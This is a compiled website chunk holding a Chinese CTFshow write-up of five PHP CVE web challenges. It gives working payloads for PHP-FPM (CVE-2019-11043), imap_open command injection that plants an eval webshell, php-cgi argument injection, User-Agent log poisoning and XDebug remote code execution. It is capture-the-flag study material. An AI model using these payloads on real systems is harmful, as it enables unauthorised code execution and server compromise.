"use strict";(self.webpackChunkmu_website=self.webpackChunkmu_website||[]).push([[5505],{34017:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>p,contentTitle:()=>d,default:()=>t,frontMatter:()=>r,metadata:()=>h,toc:()=>l});var i=s(74848),c=s(28453);const r={},d=void 0,h={id:"Web/CTFshow\u5165\u95e8/phpCVE",title:"phpCVE",description:"\u53ef\u80fd\u5199\u7684\u6709\u70b9\u5570\u55e6\uff0c\u8bb0\u5f55\u81ea\u5df1\u505a\u9898\u7684\u8fc7\u7a0b",source:"@site/docs/Web/CTFshow\u5165\u95e8/09-phpCVE.md",sourceDirName:"Web/CTFshow\u5165\u95e8",slug:"/Web/CTFshow\u5165\u95e8/phpCVE",permalink:"/docs/Web/CTFshow\u5165\u95e8/phpCVE",draft:!1,unlisted:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/Web/CTFshow\u5165\u95e8/09-phpCVE.md",tags:[],version:"current",sidebarPosition:9,frontMatter:{},sidebar:"Web",previous:{title:"\u4ee3\u7801\u5ba1\u8ba1",permalink:"/docs/Web/CTFshow\u5165\u95e8/\u4ee3\u7801\u5ba1\u8ba1"},next:{title:"XSS",permalink:"/docs/Web/CTFshow\u5165\u95e8/XSS"}},p={},l=[{value:"web311",id:"web311",level:3},{value:"web312",id:"web312",level:3},{value:"web313",id:"web313",level:3},{value:"web314",id:"web314",level:3},{value:"web315",id:"web315",level:3}];function a(e){const n={a:"a",blockquote:"blockquote",code:"code",del:"del",h3:"h3",img:"img",p:"p",pre:"pre",strong:"strong",...(0,c.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.p,{children:"\u53ef\u80fd\u5199\u7684\u6709\u70b9\u5570\u55e6\uff0c\u8bb0\u5f55\u81ea\u5df1\u505a\u9898\u7684\u8fc7\u7a0b"}),"\n",(0,i.jsx)(n.h3,{id:"web311",children:"web311"}),"\n",(0,i.jsx)(n.p,{children:"phpCVE,\u6253\u5f00\u53ea\u6709\u4e00\u4e2awhere is flag\u9875\u9762\uff0c\u6ce8\u91ca\u4e5f\u5c31\u53ea\u8bf4\u4e86cve"}),"\n",(0,i.jsx)(n.p,{children:"\u4e8e\u662f\u53bb\u767e\u5ea6\u770b\u770b\uff0c\u53d1\u73b0\u8fd9\u4e5f\u592a\u591a\u4e86\u5427\u3002\u770b\u770b\u7fa4\u4e3b\u7684\u63cf\u8ff0"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-\u63cf\u8ff0",children:"\u4f3c\u66fe\u76f8\u8bc6,\u5c31\u8fd9\u4e00\u4e2a\u6587\u4ef6\uff0c\u4e0d\u7528\u626b\u63cf\n"})}),"\n",(0,i.jsx)(n.p,{children:"emmm\uff0c\u8fd8\u662f\u5148\u6293\u4e2a\u5305\u5427"}),"\n",(0,i.jsx)(n.p,{children:"\u53d1\u5305\u53d1\u73b0\u54cd\u5e94\uff1aX-Powered-By: PHP/7.1.33dev"}),"\n",(0,i.jsx)(n.p,{children:"\u7136\u540e\u53bb\u641c\u4e86\u4e00\u4e0b\u53d1\u73b0\u4e3a\u5565\u5f88\u591a\u6f0f\u6d1e\u7684\u4fee\u590d\u7248\u672c\u662f7.1.33\u3002\u8fd8\u662f\u53bb\u8bd5\u8bd5"}),"\n",(0,i.jsx)(n.p,{children:"\u641cphp7.1.33\u4e3b\u8981\u90fd\u662f\u641c\u5230CVE-2019-11043\uff0c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"}),"\n",(0,i.jsx)(n.p,{children:"\u8be5\u6f0f\u6d1e\u4f4d\u4e8ePHP-FPM\u6a21\u5757\u7684env_path_info\u51fd\u6570\uff0c\u5728\u7279\u5b9a\u7684nginx + php-fpm\u914d\u7f6e\u4e2d\uff0cweb\u7528\u6237\u5c31\u53ef\u80fd\u4f1a\u8fdb\u884c\u4ee3\u7801\u6267\u884c\u3002\u8be5\u6f0f\u6d1e\u9700\u8981\u5728nginx.conf\u4e2d\u8fdb\u884c\u7279\u5b9a\u914d\u7f6e\u624d\u80fd\u89e6\u53d1\u3002\u914d\u7f6e\u5982\u4e0b"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:"location ~ [^/]\\.php(/|$) {\r\n  ...\r\n  fastcgi_split_path_info ^(.+?\\.php)(/.*)$;\r\n  fastcgi_param PATH_INFO       $fastcgi_path_info;\r\n  fastcgi_pass   php:9000;\r\n  ...\r\n}\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u4f7f\u7528%0a\uff08\u6362\u884c\u7b26\uff09\u6765\u7834\u574f\u6b63\u5219\uff0c\u4ece\u800c\u4f7f\u5f97PATH_INFO\u4e3a\u7a7a"}),"\n",(0,i.jsx)(n.p,{children:"**\u5229\u7528\u6761\u4ef6\uff1a**nginx\u914d\u7f6e\u4e86fastcgi_split_path_info"}),"\n",(0,i.jsx)(n.p,{children:"**\u53d7\u5f71\u54cd\u7cfb\u7edf\uff1a**PHP 5.6-7.x\uff0cNginx>=0.7.31"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"\u590d\u73b0\u9700\u8981golang\u73af\u5883"})}),"\n",(0,i.jsx)(n.p,{children:"\u987a\u4fbf\u53bb\u770b\u770b\u670d\u52a1\u5668\u6709\u6ca1\u6709golang\u73af\u5883\uff0c\u6ca1\u6709\u5c31\u987a\u4fbf\u88c5\u4e00\u4e2a\uff08\u4e3b\u8981\u662f\u670d\u52a1\u5668\u88c5\u7684\u5feb\u8fd8\u4e0d\u7528\u6211\u6d41\u91cf\uff09"}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"sudo apt install golang"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"\u5b89\u88c5\u5de5\u5177\uff1a"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-javascript",children:"git clone https://github.com/neex/phuip-fpizdam.git\r\ncd phuip-fpizdam\r\ngo get -v && go build\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u95ee\u9898\uff1a"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u6267\u884cgo get -v && go build\u4f1a\u4e00\u76f4\u6ca1\u53cd\u5e94\r\n\u56e0\u4e3ago proxy\u9ed8\u8ba4\u4e3aproxy.golang.org\uff0c\u56fd\u5185\u65e0\u6cd5\u8bbf\u95ee\r\n\u6267\u884c\u547d\u4ee4\u6362\u4ee3\u7406\uff1ago env -w GOPROXY=https://goproxy.cn\r\n\u518d\u6b21\u6267\u884cgo get -v && go build\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20220115162742740",src:s(80751).A+"",width:"737",height:"332"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"\u6f0f\u6d1e\u5229\u7528"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-payload",children:'go run . "http://92cdd785-55c4-4b35-85fa-ae1dc7fdc367.challenge.ctf.show/index.php"\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20220115163024870",src:s(31697).A+"",width:"1136",height:"261"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20220115163119978",src:s(39151).A+"",width:"1111",height:"167"})}),"\n",(0,i.jsx)(n.p,{children:"\u7136\u540e\u6211\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\uff0c\u6709\u65f6\u5019\u6267\u884c\u547d\u4ee4\u6709\u56de\u663e\uff0c\u6709\u65f6\u5019\u6267\u884c\u65e0\u56de\u663e"}),"\n",(0,i.jsx)(n.p,{children:"\u603b\u4e4b\u591a\u6267\u884c\u51e0\u6b21?a=ls\uff0c\u53ef\u4ee5\u53d1\u73b0\u5f53\u524d\u76ee\u5f55\u6709\u4e00\u4e2afl0gHe1e.txt"}),"\n",(0,i.jsx)(n.p,{children:"\u76f4\u63a5\u8bbf\u95ee\u5373\u53ef"}),"\n",(0,i.jsx)(n.h3,{id:"web312",children:"web312"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20220115163333495",src:s(32263).A+"",width:"1416",height:"458"})}),"\n",(0,i.jsx)(n.p,{children:"\u4f9d\u65e7\u662f\u5148\u6293\u5305\uff1a"}),"\n",(0,i.jsx)(n.p,{children:"Server: nginx/1.21.1"}),"\n",(0,i.jsx)(n.p,{children:"X-Powered-By: PHP/5.6.38"}),"\n",(0,i.jsx)(n.p,{children:"\u767e\u5ea6\u8fd9\u4e2aphp\u7248\u672c\uff0c\u6211\u767e\u5ea6\u5230\u4e86CVE-2018-19518\uff08\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff09"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"\u6f0f\u6d1e\u7b80\u4ecb"})}),"\n",(0,i.jsx)(n.p,{children:"php imap\u6269\u5c55\u7528\u4e8e\u5728PHP\u4e2d\u6267\u884c\u90ae\u4ef6\u6536\u53d1\u64cd\u4f5c\u3002\u5176imap_open\u51fd\u6570\u4f1a\u8c03\u7528rsh\u6765\u8fde\u63a5\u8fdc\u7a0bshell\uff0c\u800cdebian/ubuntu\u4e2d\u9ed8\u8ba4\u4f7f\u7528ssh\u6765\u4ee3\u66ffrsh\u7684\u529f\u80fd\uff08\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728debian\u7cfb\u5217\u7cfb\u7edf\u4e2d\uff0c\u6267\u884crsh\u547d\u4ee4\u5b9e\u9645\u6267\u884c\u7684\u662fssh\u547d\u4ee4\uff09\u3002\r\n\u56e0\u4e3assh\u547d\u4ee4\u4e2d\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e-oProxyCommand=\u6765\u8c03\u7528\u7b2c\u4e09\u65b9\u547d\u4ee4\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6ce8\u5165\u6ce8\u5165\u8fd9\u4e2a\u53c2\u6570\uff0c\u6700\u7ec8\u5c06\u5bfc\u81f4\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"\u5f71\u54cd\u7248\u672c"})}),"\n",(0,i.jsx)(n.p,{children:"PHP\uff1a5.6.38\r\n\u7cfb\u7edf\uff1aDebian/ubuntu"}),"\n",(0,i.jsx)(n.p,{children:"\u770b\u5b8c\u8fd9\u4e2a\u7b80\u4ecb\uff0c\u5f88\u660e\u663e\u627e\u5bf9\u4e86\u6f0f\u6d1e\uff0c\u767e\u5ea6\u627e\u4e00\u4e2a\u590d\u73b0\u7684\u5c31\u597d"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"\u6f0f\u6d1e\u5229\u7528"})}),"\n",(0,i.jsx)(n.p,{children:"\u5148\u968f\u4fbf\u53d1\u4e00\u4e2a\u5305"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20220115163901534",src:s(48742).A+"",width:"553",height:"491"})}),"\n",(0,i.jsx)(n.p,{children:"\u7136\u540e\u5bf9\u81ea\u5df1\u60f3\u8981\u53d1\u7684\u5185\u5bb9\u8fdb\u884c\u4e00\u6b21base64\u7f16\u7801"}),"\n",(0,i.jsxs)(n.p,{children:["\u9996\u5148\u5bf9",(0,i.jsx)(n.code,{children:"<?php @eval($_POST[mumuzi]);?>"}),"\u8fdb\u884c\u4e00\u6b21base64\u7f16\u7801"]}),"\n",(0,i.jsxs)(n.p,{children:["\u7136\u540e\u5bf9",(0,i.jsx)(n.code,{children:'echo "PD9waHAgQGV2YWwoJF9QT1NUW211bXV6aV0pOz8+" | base64 -d >/var/www/html/ma.php'}),"\u8fdb\u884c\u4e00\u6b21base64\u7f16\u7801"]}),"\n",(0,i.jsx)(n.p,{children:"\u5f97\u5230ZWNobyAiUEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VVzIxMWJYVjZhVjBwT3o4KyIgfCBiYXNlNjQgLWQgPi92YXIvd3d3L2h0bWwvbWEucGhw"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"\u6ce8\u610f\u4e8b\u9879"}),"\uff1a\u5982\u679c\u8fdb\u884cbase64\u7f16\u7801\u540e\uff0c\u542b\u6709+ =\uff0c\u90fd\u8981\u8fdb\u884curl\u7f16\u7801\u5373%2b %3d\uff0c\u6240\u4ee5\u4e3a\u4e86\u4fdd\u8bc1\u4e0d\u4f1a\u51fa\u9519\uff0c\u6700\u597d\u518d\u5bf9\u5f97\u5230\u7684base64\u7f16\u7801\u540e\u7684\u5b57\u7b26\u4e32\u518d\u8fdb\u884curl\u7f16\u7801\u3002\u76f8\u5f53\u4e8e\u6b65\u9aa4\u4e3a\u5148base64\u7f16\u7801\uff0c\u518durl\u7f16\u7801"]}),"\n",(0,i.jsxs)(n.p,{children:["\u7136\u540e\u5c06hostname\u7684\u5185\u5bb9\u66ff\u6362\u6210",(0,i.jsx)(n.code,{children:"x+-oProxyCommand%3decho%09\u7f16\u7801\u540e\u7684\u5185\u5bb9|base64%09-d|sh}"})]}),"\n",(0,i.jsxs)(n.p,{children:["\u5373",(0,i.jsx)(n.code,{children:"x+-oProxyCommand%3decho%09ZWNobyAiUEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VVzIxMWJYVjZhVjBwT3o4KyIgfCBiYXNlNjQgLWQgPi92YXIvd3d3L2h0bWwvbWEucGhw|base64%09-d|sh}"})]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20220115164850255",src:s(13768).A+"",width:"1135",height:"572"})}),"\n",(0,i.jsx)(n.p,{children:"\u867d\u7136\u6709\u62a5\u9519\uff0c\u4f46\u662f\u8bbf\u95eema.php\u53d1\u73b0\u5df2\u7ecf\u5b58\u5728\u6b64\u9875\u9762"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20220115164929866",src:s(42795).A+"",width:"816",height:"896"})}),"\n",(0,i.jsx)(n.p,{children:"\u6210\u529f\u6267\u884c"}),"\n",(0,i.jsx)(n.h3,{id:"web313",children:"web313"}),"\n",(0,i.jsx)(n.p,{children:"\u4f9d\u65e7\u662fwhere is flag?\u8001\u89c4\u77e9\u6293\u5305"}),"\n",(0,i.jsx)(n.p,{children:"\u8fd9\u4e00\u6b21\u662fX-Powered-By: PHP/5.4.1"}),"\n",(0,i.jsxs)(n.p,{children:["\u8c37\u6b4c\u641c\u5230CVE-2012-1823\uff0c\u597d\u5bb6\u4f19\uff0c\u8fd9\u4e0dcatf1ag\u590d\u73b0\u8fc7\u7684\u9898\u76ee\uff08CGI\uff09\u5177\u4f53\u53ef\u4ee5\u770bP\u795e\u535a\u5ba2",(0,i.jsx)(n.a,{href:"https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html",children:"https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html"})]}),"\n",(0,i.jsx)(n.p,{children:"\u4e4b\u524d\u56e0\u4e3a\u505a\u8fc7\u4e00\u6b21\uff0c\u6211\u8fd9\u91cc\u5c31\u76f4\u63a5\u62ffpayload\u6253\u4e86"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20220115165753765",src:s(6293).A+"",width:"888",height:"277"})}),"\n",(0,i.jsx)(n.p,{children:"\u6700\u7ec8payload"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-payload",children:'/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input\r\n\r\n<?php echo system("cat /somewhere/fla9.txt"); ?>\n'})}),"\n",(0,i.jsx)(n.h3,{id:"web314",children:"web314"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:"<?php\r\n\r\nerror_reporting(0);\r\n\r\nhighlight_file(__FILE__);\r\n\r\n//phpinfo\r\n$file = $_GET['f'];\r\n\r\nif(!preg_match('/\\:/',$file)){\r\n    include($file);\r\n}\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u5e94\u8be5\u662f\u8bf4flag\u5728phpinfo\u91cc"}),"\n",(0,i.jsx)(n.p,{children:"\u8fd9\u91cc\u8fc7\u6ee4\u4e86\u5192\u53f7\uff0c\u6211\u5bfb\u601dweb81\u4e0d\u4e5f\u662f\u8fc7\u6ee4\u5192\u53f7\u7684\u4e48\uff0c\u751a\u81f3\u8fd8\u8fc7\u6ee4\u4e86php\u548cdata"}),"\n",(0,i.jsx)(n.p,{children:"\u7136\u540e\u6211\u770b\u4e86\u4e00\u773c\u5199\u7684web81\u7684wp\uff0c\u5c1d\u8bd5\u53bb\u8ddf\u7740\u64cd\u4f5c\u8bd5\u8bd5"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20220115170314625",src:s(4759).A+"",width:"1135",height:"705"})}),"\n",(0,i.jsx)(n.p,{children:"\u6210\u529f"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20220115170559086",src:s(58305).A+"",width:"1156",height:"752"})}),"\n",(0,i.jsx)(n.p,{children:"\u5947\u602a\u4e86\uff0c\u4e3a\u4ec0\u4e48\u8bf4\u6ca1\u6709\u5462"}),"\n",(0,i.jsx)(n.p,{children:"\u770b\u4e00\u4e0b\u6839\u76ee\u5f55\uff0c\u54e6flag\u5728\u6839\u76ee\u5f55"}),"\n",(0,i.jsx)(n.p,{children:"\u6700\u540e:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-payload",children:"GET /?f=/var/log/nginx/access.log\r\nUA\u5199User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36<?php system('cat /fl6g');?>\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u53d1\u5305\u4e4b\u540e\u518d\u8bbf\u95ee\u4e00\u6b21\u5373\u53ef"}),"\n",(0,i.jsx)(n.h3,{id:"web315",children:"web315"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.del,{children:"\u4e3a\u4ec0\u4e48\u63a8\u8350\u5907\u7528\u73af\u5883\u634f"})}),"\n",(0,i.jsx)(n.p,{children:"PHP/7.1.12\uff0c\u9898\u76ee\u63cf\u8ff0\uff1adebug\u5f00\u542f\uff0c\u7aef\u53e39000"}),"\n",(0,i.jsx)(n.p,{children:"\u4e8e\u662f\u53bb\u767e\u5ea6debug 9000 CVE"}),"\n",(0,i.jsx)(n.p,{children:"\u7b2c\u4e00\u7bc7\u5c31\u662fctfshow PHPCVE wp\u3002\u3002\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u8fd9\u4e5f\u7b97\u81ea\u5df1\u505a\u7684\u8fc7\u7a0b\uff0c\u90a3\u5c31\u76f4\u63a5\u770b\u4e86\u5427"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"XDebug \u8fdc\u7a0b\u8c03\u8bd5\u6f0f\u6d1e"}),"\uff1a",(0,i.jsx)(n.a,{href:"https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce",children:"https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce"})]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"\u5f71\u54cd"})}),"\n",(0,i.jsxs)(n.p,{children:["XDebug\u662fPHP\u7684\u4e00\u4e2a\u6269\u5c55\uff0c\u7528\u4e8e\u8c03\u8bd5PHP\u4ee3\u7801\u3002\u5982\u679c\u76ee\u6807\u5f00\u542f\u4e86\u8fdc\u7a0b\u8c03\u8bd5\u6a21\u5f0f\uff0c\u5e76\u8bbe\u7f6e",(0,i.jsx)(n.code,{children:"remote_connect_back = 1"}),"\uff1a"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"xdebug.remote_connect_back = 1\r\nxdebug.remote_enable = 1\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u8fd9\u4e2a\u914d\u7f6e\u4e0b\uff0c\u6211\u4eec\u8bbf\u95ee",(0,i.jsx)(n.code,{children:"http://target/index.php?XDEBUG_SESSION_START=phpstorm"}),"\uff0c\u76ee\u6807\u670d\u52a1\u5668\u7684XDebug\u5c06\u4f1a\u8fde\u63a5\u8bbf\u95ee\u8005\u7684IP\uff08\u6216",(0,i.jsx)(n.code,{children:"X-Forwarded-For"}),"\u5934\u6307\u5b9a\u7684\u5730\u5740\uff09\u5e76\u901a\u8fc7dbgp\u534f\u8bae\u4e0e\u5176\u901a\u4fe1\uff0c\u6211\u4eec\u901a\u8fc7dbgp\u4e2d\u63d0\u4f9b\u7684eval\u65b9\u6cd5\u5373\u53ef\u5728\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4efb\u610fPHP\u4ee3\u7801\u3002"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"\u6f0f\u6d1e\u5229\u7528"})}),"\n",(0,i.jsx)(n.p,{children:"\u56e0\u4e3a\u9700\u8981\u4f7f\u7528dbgp\u534f\u8bae\u4e0e\u76ee\u6807\u670d\u52a1\u5668\u901a\u4fe1\uff0c\u6240\u4ee5\u65e0\u6cd5\u7528http\u534f\u8bae\u590d\u73b0\u6f0f\u6d1e"}),"\n",(0,i.jsxs)(n.p,{children:["\u6709\u5df2\u7ecf\u7f16\u5199\u597d\u7684\u811a\u672c\uff1a",(0,i.jsx)(n.a,{href:"https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py",children:"https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py"})]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-payload",children:"python3 exp.py -t http://be189f8f-1425-41a8-b830-87f722a186df.challenge.ctf.show/index.php -c 'shell_exec(\"ls /\");'\n"})}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"\u6ce8\u610f"}),"\uff1a",(0,i.jsx)(n.strong,{children:"\u56e0\u4e3a\u8be5\u901a\u4fe1\u662f\u4e00\u4e2a\u53cd\u5411\u8fde\u63a5\u7684\u8fc7\u7a0b\uff0cexp.py\u542f\u52a8\u540e\u5176\u5b9e\u662f\u4f1a\u76d1\u542c\u672c\u5730\u76849000\u7aef\u53e3\uff08\u53ef\u901a\u8fc7-l\u53c2\u6570\u6307\u5b9a\uff09\u5e76\u7b49\u5f85XDebug\u524d\u6765\u8fde\u63a5\uff0c\u6240\u4ee5\u6267\u884c\u8be5\u811a\u672c\u7684\u670d\u52a1\u5668\u5fc5\u987b\u6709\u5916\u7f51IP\uff08\u6216\u8005\u4e0e\u76ee\u6807\u670d\u52a1\u5668\u5904\u4e8e\u540c\u4e00\u5185\u7f51\uff09"})]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20220115172447841",src:s(80436).A+"",width:"1298",height:"360"})}),"\n",(0,i.jsx)(n.p,{children:"\u5f04\u4e86\u597d\u51e0\u6b21\u4e5f\u6ca1\u6210\u529f\uff0c\u602a\u4e0d\u5f97\u7fa4\u4e3b\u5728\u63cf\u8ff0\u4e2d\u5199\u63a8\u8350\u4f7f\u7528\u5907\u7528\u73af\u5883\u554a\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u7136\u540e\u53eb\u7fa4\u4e3b\u4fee\u4e86\u5907\u7528\u73af\u5883"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20220115214058959",src:s(88385).A+"",width:"1705",height:"201"})}),"\n",(0,i.jsx)(n.p,{children:"\u8bbf\u95ee\u5373\u53ef"}),"\n",(0,i.jsx)(n.p,{children:"\u81f3\u6b64\uff0cphpCVE\u677f\u5757\u7ed3\u675f"})]})}function t(e={}){const{wrapper:n}={...(0,c.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(a,{...e})}):a(e)}},80751:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20220115162742740-cab4d67b1c797b46e1b9294ef7289115.png"},31697:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20220115163024870-cb71049cb2228a70b5e93e316276c1cb.png"},39151:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20220115163119978-bb0bb40705c6025b9c74f140b404d542.png"},32263:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20220115163333495-17fdafcd08790541579064dc47f334e4.png"},48742:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20220115163901534-a9e89dafb5b38efa4e6408f5cec8ff1e.png"},13768:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20220115164850255-aef39d86eb90be3976ef3ec3af747e03.png"},42795:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20220115164929866-be7f04b2d1ebe1fb31656289010e4d82.png"},6293:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20220115165753765-3c198f3d62a9168c7204b3ac72d7431d.png"},4759:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20220115170314625-cdb44a67708752c33d3352afc8cfcccd.png"},58305:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20220115170559086-2773399c4752686f8a7852da61692b61.png"},80436:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20220115172447841-caa9cc69642394c36e572735efc19fd1.png"},88385:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20220115214058959-114c8c08769139d4a63789df0f141627.png"},28453:(e,n,s)=>{s.d(n,{R:()=>d,x:()=>h});var i=s(96540);const c={},r=i.createContext(c);function d(e){const n=i.useContext(r);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function h(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(c):e.components||c:d(e.components),i.createElement(r.Provider,{value:n},e.children)}}}]);